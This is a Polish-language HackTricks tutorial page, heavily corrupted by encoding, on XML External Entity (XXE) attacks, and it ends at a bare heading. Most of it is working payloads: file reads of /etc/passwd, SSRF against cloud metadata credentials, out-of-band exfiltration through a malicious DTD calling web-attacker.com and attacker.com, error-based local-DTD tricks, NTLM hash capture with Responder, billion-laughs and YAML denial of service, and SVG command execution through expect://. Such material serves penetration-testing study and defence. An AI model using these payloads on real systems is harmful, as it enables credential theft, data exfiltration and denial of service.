# XXE - XEE - XML External Entity

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Podstawy XML

XML to jÄ™zyk znacznikÃ³w zaprojektowany do przechowywania i transportu danych, charakteryzujÄ…cy siÄ™ elastycznÄ… strukturÄ…, ktÃ³ra pozwala na uÅ¼ycie opisowo nazwanych znacznikÃ³w. RÃ³Å¼ni siÄ™ od HTML tym, Å¼e nie jest ograniczony do zestawu zdefiniowanych znacznikÃ³w. Znaczenie XML spadÅ‚o wraz z rosnÄ…cÄ… popularnoÅ›ciÄ… JSON, mimo jego poczÄ…tkowej roli w technologii AJAX.

* **Reprezentacja danych przez encje**: Encje w XML umoÅ¼liwiajÄ… reprezentacjÄ™ danych, w tym znakÃ³w specjalnych, takich jak `&lt;` i `&gt;`, ktÃ³re odpowiadajÄ… `<` i `>`, aby uniknÄ…Ä‡ konfliktu z systemem znacznikÃ³w XML.
* **Definiowanie elementÃ³w XML**: XML pozwala na definiowanie typÃ³w elementÃ³w, okreÅ›lajÄ…c, jak elementy powinny byÄ‡ zbudowane i jakie treÅ›ci mogÄ… zawieraÄ‡, od dowolnego typu treÅ›ci po konkretne elementy podrzÄ™dne.
* **Definicja typu dokumentu (DTD)**: DTD sÄ… kluczowe w XML do definiowania struktury dokumentu i typÃ³w danych, ktÃ³re moÅ¼e zawieraÄ‡. MogÄ… byÄ‡ wewnÄ™trzne, zewnÄ™trzne lub kombinacjÄ…, kierujÄ…c, jak dokumenty sÄ… formatowane i walidowane.
* **Encje niestandardowe i zewnÄ™trzne**: XML wspiera tworzenie niestandardowych encji w DTD dla elastycznej reprezentacji danych. Encje zewnÄ™trzne, definiowane za pomocÄ… URL, budzÄ… obawy dotyczÄ…ce bezpieczeÅ„stwa, szczegÃ³lnie w kontekÅ›cie atakÃ³w XML External Entity (XXE), ktÃ³re wykorzystujÄ… sposÃ³b, w jaki parsery XML obsÅ‚ugujÄ… zewnÄ™trzne ÅºrÃ³dÅ‚a danych: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **Wykrywanie XXE za pomocÄ… encji parametru**: Do wykrywania podatnoÅ›ci XXE, szczegÃ³lnie gdy konwencjonalne metody zawodzÄ… z powodu Å›rodkÃ³w bezpieczeÅ„stwa parsera, moÅ¼na wykorzystaÄ‡ encje parametru XML. Te encje pozwalajÄ… na techniki wykrywania poza pasmem, takie jak wywoÅ‚ywanie zapytaÅ„ DNS lub HTTP do kontrolowanej domeny, aby potwierdziÄ‡ podatnoÅ›Ä‡.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## GÅ‚Ã³wne ataki

[**WiÄ™kszoÅ›Ä‡ tych atakÃ³w byÅ‚a testowana przy uÅ¼yciu wspaniaÅ‚ych laboratoriÃ³w XEE Portswigger: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Test nowej encji

W tym ataku zamierzam przetestowaÄ‡, czy prosta deklaracja nowej ENCI dziaÅ‚a.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### Odczyt pliku

SprÃ³bujmy odczytaÄ‡ `/etc/passwd` na rÃ³Å¼ne sposoby. Dla systemu Windows moÅ¼esz sprÃ³bowaÄ‡ odczytaÄ‡: `C:\windows\system32\drivers\etc\hosts`

W tym pierwszym przypadku zauwaÅ¼, Å¼e SYSTEM "_\*\*file:///\*\*etc/passwd_" rÃ³wnieÅ¼ zadziaÅ‚a.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

Ten drugi przypadek powinien byÄ‡ przydatny do wyodrÄ™bnienia pliku, jeÅ›li serwer WWW uÅ¼ywa PHP (Nie dotyczy to laboratoriÃ³w Portswigger).
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
W tym trzecim przypadku zauwaÅ¼amy, Å¼e deklarujemy `Element stockCheck` jako ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Lista katalogÃ³w

W aplikacjach opartych na **Javie** moÅ¼e byÄ‡ moÅ¼liwe **wylistowanie zawartoÅ›ci katalogu** za pomocÄ… XXE z Å‚adunkiem takim jak (po prostu pytajÄ…c o katalog zamiast pliku):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE moÅ¼e byÄ‡ uÅ¼yte do naduÅ¼ycia SSRF w chmurze
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

UÅ¼ywajÄ…c **wczeÅ›niej skomentowanej techniki**, moÅ¼esz sprawiÄ‡, Å¼e serwer uzyska dostÄ™p do serwera, ktÃ³ry kontrolujesz, aby pokazaÄ‡, Å¼e jest podatny. Ale jeÅ›li to nie dziaÅ‚a, moÅ¼e to byÄ‡ spowodowane tym, Å¼e **jednostki XML nie sÄ… dozwolone**, w takim przypadku moÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ **jednostek parametrÃ³w XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltracja danych poza pasmem

**W tej sytuacji sprawimy, Å¼e serwer zaÅ‚aduje nowy DTD z zÅ‚oÅ›liwym Å‚adunkiem, ktÃ³ry wyÅ›le zawartoÅ›Ä‡ pliku za pomocÄ… Å¼Ä…dania HTTP (w przypadku plikÃ³w wieloliniowych moÅ¼esz sprÃ³bowaÄ‡ wyeksportowaÄ‡ je za pomocÄ… \_ftp://**\_ uÅ¼ywajÄ…c na przykÅ‚ad tego podstawowego serwera [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). To wyjaÅ›nienie opiera siÄ™ na** [**laboratorium Portswigger tutaj**](https://portswigger.net/web-security/xxe/blind)**.**

W podanym zÅ‚oÅ›liwym DTD przeprowadzane sÄ… szereg krokÃ³w w celu exfiltracji danych:

### PrzykÅ‚ad zÅ‚oÅ›liwego DTD:

Struktura jest nastÄ™pujÄ…ca:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:

1. **Definicja encji parametru:**
* Tworzona jest encja parametru XML, `%file`, ktÃ³ra odczytuje zawartoÅ›Ä‡ pliku `/etc/hostname`.
* Definiowana jest kolejna encja parametru XML, `%eval`. Dynamicznie deklaruje nowÄ… encjÄ™ parametru XML, `%exfiltrate`. Encja `%exfiltrate` jest ustawiona tak, aby wykonaÄ‡ Å¼Ä…danie HTTP do serwera atakujÄ…cego, przekazujÄ…c zawartoÅ›Ä‡ encji `%file` w ciÄ…gu zapytania URL.
2. **Wykonanie encji:**
* Wykorzystywana jest encja `%eval`, co prowadzi do wykonania dynamicznej deklaracji encji `%exfiltrate`.
* NastÄ™pnie uÅ¼ywana jest encja `%exfiltrate`, co wyzwala Å¼Ä…danie HTTP do okreÅ›lonego URL z zawartoÅ›ciÄ… pliku.

AtakujÄ…cy hostuje ten zÅ‚oÅ›liwy DTD na serwerze pod swojÄ… kontrolÄ…, zazwyczaj pod adresem URL takim jak `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** Aby wykorzystaÄ‡ podatnÄ… aplikacjÄ™, atakujÄ…cy wysyÅ‚a Å‚adunek XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
This payload defines an XML parameter entity `%xxe` and incorporates it within the DTD. When processed by an XML parser, this payload fetches the external DTD from the attacker's server. The parser then interprets the DTD inline, executing the steps outlined in the malicious DTD and leading to the exfiltration of the `/etc/hostname` file to the attacker's server.

### Error Based(External DTD)

**W tym przypadku sprawimy, Å¼e serwer zaÅ‚aduje zÅ‚oÅ›liwe DTD, ktÃ³re wyÅ›wietli zawartoÅ›Ä‡ pliku w komunikacie o bÅ‚Ä™dzie (to jest waÅ¼ne tylko, jeÅ›li moÅ¼esz zobaczyÄ‡ komunikaty o bÅ‚Ä™dach).** [**PrzykÅ‚ad stÄ…d.**](https://portswigger.net/web-security/xxe/blind)

Komunikat o bÅ‚Ä™dzie parsowania XML, ujawniajÄ…cy zawartoÅ›Ä‡ pliku `/etc/passwd`, moÅ¼na wywoÅ‚aÄ‡ za pomocÄ… zÅ‚oÅ›liwego zewnÄ™trznego Definicji Typu Dokumentu (DTD). OsiÄ…ga siÄ™ to poprzez nastÄ™pujÄ…ce kroki:

1. Definiuje siÄ™ encjÄ™ parametru XML o nazwie `file`, ktÃ³ra zawiera zawartoÅ›Ä‡ pliku `/etc/passwd`.
2. Definiuje siÄ™ encjÄ™ parametru XML o nazwie `eval`, ktÃ³ra zawiera dynamicznÄ… deklaracjÄ™ dla innej encji parametru XML o nazwie `error`. Ta encja `error`, po ocenie, prÃ³buje zaÅ‚adowaÄ‡ nieistniejÄ…cy plik, uÅ¼ywajÄ…c zawartoÅ›ci encji `file` jako swojej nazwy.
3. WywoÅ‚ywana jest encja `eval`, co prowadzi do dynamicznej deklaracji encji `error`.
4. WywoÅ‚anie encji `error` skutkuje prÃ³bÄ… zaÅ‚adowania nieistniejÄ…cego pliku, co generuje komunikat o bÅ‚Ä™dzie, ktÃ³ry zawiera zawartoÅ›Ä‡ pliku `/etc/passwd` jako czÄ™Å›Ä‡ nazwy pliku.

ZÅ‚oÅ›liwe zewnÄ™trzne DTD moÅ¼na wywoÅ‚aÄ‡ za pomocÄ… nastÄ™pujÄ…cego XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, odpowiedÅº serwera WWW powinna zawieraÄ‡ komunikat o bÅ‚Ä™dzie wyÅ›wietlajÄ…cy zawartoÅ›Ä‡ pliku `/etc/passwd`.

![](<../.gitbook/assets/image (809).png>)

_**ProszÄ™ zauwaÅ¼yÄ‡, Å¼e zewnÄ™trzny DTD pozwala nam na uwzglÄ™dnienie jednej encji wewnÄ…trz drugiej (****`eval`****), ale jest to zabronione w wewnÄ™trznym DTD. Dlatego nie moÅ¼esz wymusiÄ‡ bÅ‚Ä™du bez uÅ¼ycia zewnÄ™trznego DTD (zwykle).**_

### **BÅ‚Ä…d oparty (system DTD)**

A co z niewidocznymi lukami XXE, gdy **interakcje poza pasmem sÄ… zablokowane** (poÅ‚Ä…czenia zewnÄ™trzne nie sÄ… dostÄ™pne)?

Luka w specyfikacji jÄ™zyka XML moÅ¼e **ujawniaÄ‡ wraÅ¼liwe dane poprzez komunikaty o bÅ‚Ä™dach, gdy DTD dokumentu Å‚Ä…czy deklaracje wewnÄ™trzne i zewnÄ™trzne**. Problem ten pozwala na wewnÄ™trznÄ… redefinicjÄ™ encji zadeklarowanych zewnÄ™trznie, co uÅ‚atwia przeprowadzenie atakÃ³w XXE opartych na bÅ‚Ä™dach. Takie ataki wykorzystujÄ… redefinicjÄ™ encji parametru XML, pierwotnie zadeklarowanej w zewnÄ™trznym DTD, z poziomu wewnÄ™trznego DTD. Gdy poÅ‚Ä…czenia poza pasmem sÄ… blokowane przez serwer, atakujÄ…cy muszÄ… polegaÄ‡ na lokalnych plikach DTD, aby przeprowadziÄ‡ atak, dÄ…Å¼Ä…c do wywoÅ‚ania bÅ‚Ä™du analizy, aby ujawniÄ‡ wraÅ¼liwe informacje.

RozwaÅ¼ scenariusz, w ktÃ³rym system plikÃ³w serwera zawiera plik DTD w `/usr/local/app/schema.dtd`, definiujÄ…cy encjÄ™ o nazwie `custom_entity`. AtakujÄ…cy moÅ¼e wywoÅ‚aÄ‡ bÅ‚Ä…d analizy XML, ujawniajÄ…c zawartoÅ›Ä‡ pliku `/etc/passwd`, przesyÅ‚ajÄ…c hybrydowy DTD w nastÄ™pujÄ…cy sposÃ³b:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
The outlined steps are executed by this DTD:

* Definicja encji parametru XML o nazwie `local_dtd` zawiera zewnÄ™trzny plik DTD znajdujÄ…cy siÄ™ w systemie plikÃ³w serwera.
* NastÄ™puje redefinicja encji parametru XML `custom_entity`, pierwotnie zdefiniowanej w zewnÄ™trznym DTD, aby otoczyÄ‡ [eksploit XXE oparty na bÅ‚Ä™dach](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ta redefinicja ma na celu wywoÅ‚anie bÅ‚Ä™du analizy, ujawniajÄ…c zawartoÅ›Ä‡ pliku `/etc/passwd`.
* Poprzez zastosowanie encji `local_dtd`, zewnÄ™trzny DTD jest zaangaÅ¼owany, obejmujÄ…c nowo zdefiniowanÄ… `custom_entity`. Ta sekwencja dziaÅ‚aÅ„ prowadzi do wygenerowania komunikatu o bÅ‚Ä™dzie, ktÃ³ry jest celem eksploitu.

**Real world example:** Systemy korzystajÄ…ce z Å›rodowiska graficznego GNOME czÄ™sto majÄ… DTD w `/usr/share/yelp/dtd/docbookx.dtd`, zawierajÄ…cy encjÄ™ o nazwie `ISOamso`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

PoniewaÅ¼ ta technika wykorzystuje **wewnÄ™trzny DTD, musisz najpierw znaleÅºÄ‡ waÅ¼ny**. MoÅ¼esz to zrobiÄ‡, **instalujÄ…c** ten sam **system operacyjny / oprogramowanie**, ktÃ³re uÅ¼ywa serwer, i **szukajÄ…c domyÅ›lnych DTD**, lub **zbierajÄ…c listÄ™** **domyÅ›lnych DTD** w systemach i **sprawdzajÄ…c**, czy ktÃ³rykolwiek z nich istnieje:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
For more information check [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Finding DTDs inside the system

W nastÄ™pujÄ…cym niesamowitym repozytorium github moÅ¼esz znaleÅºÄ‡ **Å›cieÅ¼ki DTD, ktÃ³re mogÄ… byÄ‡ obecne w systemie**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Ponadto, jeÅ›li masz **obraz Dockera systemu ofiary**, moÅ¼esz uÅ¼yÄ‡ narzÄ™dzia z tego samego repozytorium, aby **zeskanowaÄ‡** **obraz** i **znaleÅºÄ‡** Å›cieÅ¼kÄ™ **DTD** obecnych w systemie. Przeczytaj [Readme repozytorium github](https://github.com/GoSecure/dtd-finder), aby dowiedzieÄ‡ siÄ™ jak.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe wyjaÅ›nienie tego ataku, **sprawdÅº drugÄ… sekcjÄ™** [**tego niesamowitego posta**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **od Detectify**.

MoÅ¼liwoÅ›Ä‡ **przesyÅ‚ania dokumentÃ³w Microsoft Office jest oferowana przez wiele aplikacji internetowych**, ktÃ³re nastÄ™pnie wyodrÄ™bniajÄ… pewne szczegÃ³Å‚y z tych dokumentÃ³w. Na przykÅ‚ad, aplikacja internetowa moÅ¼e pozwoliÄ‡ uÅ¼ytkownikom na importowanie danych poprzez przesyÅ‚anie arkusza kalkulacyjnego w formacie XLSX. Aby parser mÃ³gÅ‚ wyodrÄ™bniÄ‡ dane z arkusza kalkulacyjnego, bÄ™dzie musiaÅ‚ zinterpretowaÄ‡ przynajmniej jeden plik XML.

Aby przetestowaÄ‡ tÄ™ podatnoÅ›Ä‡, konieczne jest stworzenie **pliku Microsoft Office zawierajÄ…cego Å‚adunek XXE**. Pierwszym krokiem jest utworzenie pustego katalogu, do ktÃ³rego dokument moÅ¼e zostaÄ‡ rozpakowany.

Po rozpakowaniu dokumentu, plik XML znajdujÄ…cy siÄ™ w `./unzipped/word/document.xml` powinien zostaÄ‡ otwarty i edytowany w preferowanym edytorze tekstu (takim jak vim). XML powinien zostaÄ‡ zmodyfikowany, aby zawieraÅ‚ poÅ¼Ä…dany Å‚adunek XXE, czÄ™sto zaczynajÄ…cy siÄ™ od Å¼Ä…dania HTTP.

Zmodyfikowane linie XML powinny byÄ‡ wstawione miÄ™dzy dwa obiekty XML root. WaÅ¼ne jest, aby zastÄ…piÄ‡ URL monitorowalnym URL-em dla Å¼Ä…daÅ„.

Na koniec plik moÅ¼na spakowaÄ‡, aby utworzyÄ‡ zÅ‚oÅ›liwy plik poc.docx. Z wczeÅ›niej utworzonego katalogu "unzipped" naleÅ¼y wykonaÄ‡ nastÄ™pujÄ…ce polecenie:

Teraz utworzony plik moÅ¼na przesÅ‚aÄ‡ do potencjalnie podatnej aplikacji internetowej i moÅ¼na mieÄ‡ nadziejÄ™, Å¼e Å¼Ä…danie pojawi siÄ™ w logach Burp Collaborator.

### Jar: protocol

ProtokÃ³Å‚ **jar** jest dostÄ™pny wyÅ‚Ä…cznie w **aplikacjach Java**. ZostaÅ‚ zaprojektowany, aby umoÅ¼liwiÄ‡ dostÄ™p do plikÃ³w w archiwum **PKZIP** (np. `.zip`, `.jar` itp.), obsÅ‚ugujÄ…c zarÃ³wno pliki lokalne, jak i zdalne.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Aby uzyskaÄ‡ dostÄ™p do plikÃ³w wewnÄ…trz plikÃ³w PKZIP, jest to **super przydatne do naduÅ¼ywania XXE za pomocÄ… systemowych plikÃ³w DTD.** SprawdÅº [tÄ™ sekcjÄ™, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼ywaÄ‡ systemowych plikÃ³w DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Proces uzyskiwania dostÄ™pu do pliku w archiwum PKZIP za pomocÄ… protokoÅ‚u jar obejmuje kilka krokÃ³w:

1. WysyÅ‚ane jest Å¼Ä…danie HTTP w celu pobrania archiwum zip z okreÅ›lonej lokalizacji, takiej jak `https://download.website.com/archive.zip`.
2. OdpowiedÅº HTTP zawierajÄ…ca archiwum jest tymczasowo przechowywana w systemie, zazwyczaj w lokalizacji takiej jak `/tmp/...`.
3. Archiwum jest nastÄ™pnie rozpakowywane, aby uzyskaÄ‡ dostÄ™p do jego zawartoÅ›ci.
4. Odczytywany jest konkretny plik w archiwum, `file.zip`.
5. Po operacji wszelkie tymczasowe pliki utworzone w tym procesie sÄ… usuwane.

InteresujÄ…cÄ… technikÄ… przerwania tego procesu w drugim kroku jest utrzymywanie poÅ‚Ä…czenia z serwerem otwartego w nieskoÅ„czonoÅ›Ä‡ podczas serwowania pliku archiwum. NarzÄ™dzia dostÄ™pne w [tej repozytorium](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) mogÄ… byÄ‡ wykorzystane do tego celu, w tym serwer Python (`slow_http_server.py`) i serwer Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Pisanie plikÃ³w w tymczasowym katalogu moÅ¼e pomÃ³c w **eskalacji innej luki, ktÃ³ra dotyczy przechodzenia Å›cieÅ¼ki** (takiej jak lokalne doÅ‚Ä…czanie plikÃ³w, wstrzykiwanie szablonÃ³w, XSLT RCE, deserializacja itp.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Atak Miliona ÅšmiechÃ³w
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Atak Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Atak kwadratowego wzrostu

![](<../.gitbook/assets/image (527).png>)

#### Uzyskiwanie NTML

Na hostach Windows moÅ¼liwe jest uzyskanie hasha NTML uÅ¼ytkownika serwera WWW, ustawiajÄ…c handler responder.py:
```bash
Responder.py -I eth0 -v
```
i wysyÅ‚ajÄ…c nastÄ™pujÄ…ce Å¼Ä…danie
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Then you can try to crack the hash using hashcat

## Ukryte XXE Powierzchnie

### XInclude

Podczas integrowania danych klienta z dokumentami XML po stronie serwera, takimi jak te w zapytaniach SOAP w backendzie, bezpoÅ›rednia kontrola nad strukturÄ… XML jest czÄ™sto ograniczona, co utrudnia tradycyjne ataki XXE z powodu ograniczeÅ„ w modyfikowaniu elementu `DOCTYPE`. Jednak atak `XInclude` oferuje rozwiÄ…zanie, pozwalajÄ…c na wstawienie zewnÄ™trznych encji w dowolnym elemencie danych dokumentu XML. Ta metoda jest skuteczna nawet wtedy, gdy tylko czÄ™Å›Ä‡ danych w generowanym przez serwer dokumencie XML moÅ¼e byÄ‡ kontrolowana.

Aby przeprowadziÄ‡ atak `XInclude`, naleÅ¼y zadeklarowaÄ‡ przestrzeÅ„ nazw `XInclude` oraz okreÅ›liÄ‡ Å›cieÅ¼kÄ™ pliku dla zamierzonej zewnÄ™trznej encji. PoniÅ¼ej znajduje siÄ™ zwiÄ™zÅ‚y przykÅ‚ad, jak taki atak moÅ¼e byÄ‡ sformuÅ‚owany:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
SprawdÅº [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) po wiÄ™cej informacji!

### SVG - PrzesyÅ‚anie plikÃ³w

Pliki przesyÅ‚ane przez uÅ¼ytkownikÃ³w do niektÃ³rych aplikacji, ktÃ³re sÄ… nastÄ™pnie przetwarzane na serwerze, mogÄ… wykorzystaÄ‡ luki w sposobie obsÅ‚ugi plikÃ³w XML lub formatÃ³w plikÃ³w zawierajÄ…cych XML. Powszechne formaty plikÃ³w, takie jak dokumenty biurowe (DOCX) i obrazy (SVG), opierajÄ… siÄ™ na XML.

Gdy uÅ¼ytkownicy **przesyÅ‚ajÄ… obrazy**, obrazy te sÄ… przetwarzane lub walidowane po stronie serwera. Nawet w przypadku aplikacji oczekujÄ…cych formatÃ³w takich jak PNG lub JPEG, **biblioteka przetwarzania obrazÃ³w serwera moÅ¼e rÃ³wnieÅ¼ obsÅ‚ugiwaÄ‡ obrazy SVG**. SVG, bÄ™dÄ…c formatem opartym na XML, moÅ¼e byÄ‡ wykorzystywane przez atakujÄ…cych do przesyÅ‚ania zÅ‚oÅ›liwych obrazÃ³w SVG, naraÅ¼ajÄ…c tym samym serwer na luki XXE (XML External Entity).

PrzykÅ‚ad takiego ataku pokazano poniÅ¼ej, gdzie zÅ‚oÅ›liwy obraz SVG prÃ³buje odczytaÄ‡ pliki systemowe:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Inna metoda polega na prÃ³bie **wykonania poleceÅ„** za pomocÄ… wrappera PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
W obu przypadkach format SVG jest uÅ¼ywany do uruchamiania atakÃ³w, ktÃ³re wykorzystujÄ… moÅ¼liwoÅ›ci przetwarzania XML oprogramowania serwera, co podkreÅ›la potrzebÄ™ solidnej walidacji danych wejÅ›ciowych i Å›rodkÃ³w bezpieczeÅ„stwa.

SprawdÅº [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) po wiÄ™cej informacji!

**ZauwaÅ¼, Å¼e pierwsza linia odczytanego pliku lub wynik wykonania pojawi siÄ™ WEWNÄ„TRZ utworzonego obrazu. Musisz mieÄ‡ dostÄ™p do obrazu, ktÃ³ry utworzyÅ‚ SVG.**

### **PDF - PrzesyÅ‚anie plikÃ³w**

Przeczytaj nastÄ™pujÄ…cy post, aby **dowiedzieÄ‡ siÄ™, jak wykorzystaÄ‡ XXE do przesyÅ‚ania pliku PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Z x-www-urlencoded do XML

